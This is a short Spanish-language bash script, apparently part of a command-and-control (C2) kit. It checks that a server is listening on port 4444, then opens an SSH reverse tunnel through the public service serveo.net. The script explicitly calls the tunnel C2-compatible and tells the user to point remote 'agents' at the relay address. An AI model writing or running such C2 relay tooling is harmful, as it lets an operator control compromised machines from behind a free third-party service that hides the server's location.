#!/bin/bash

echo "=========================================="
echo "  TÚNEL TCP con Serveo (Sin instalación)"
echo "=========================================="
echo ""
echo "Serveo es como ngrok pero:"
echo "  ✅ NO requiere instalación"
echo "  ✅ NO requiere cuenta"
echo "  ✅ NO requiere tarjeta"
echo "  ✅ TCP puro (compatible con tu C2)"
echo "  ✅ 100% gratis"
echo ""

# Verificar si el servidor está corriendo
if ! ss -tlnp 2>/dev/null | grep -q ":4444"; then
    echo "⚠️  ERROR: No hay servidor corriendo en puerto 4444"
    echo ""
    echo "Debes iniciar el servidor PRIMERO:"
    echo ""
    echo "  Terminal 1:"
    echo "  cd server"
    echo "  python3 server.py"
    echo ""
    echo "  Terminal 2:"
    echo "  ./tunnel_serveo.sh"
    echo ""
    exit 1
fi

echo "✅ Servidor detectado en puerto 4444"
echo ""
echo "Creando túnel SSH a través de Serveo..."
echo ""
echo "IMPORTANTE: Cuando se conecte, verás algo como:"
echo "  Forwarding TCP connections from serveo.net:12345"
echo ""
echo "Esa es la URL y puerto que debes usar en los agentes:"
echo "  python3 agent_ngrok.py serveo.net 12345"
echo ""
echo "Presiona Ctrl+C para detener el túnel"
echo ""
sleep 2

# Crear túnel
ssh -R 4444:localhost:4444 serveo.net
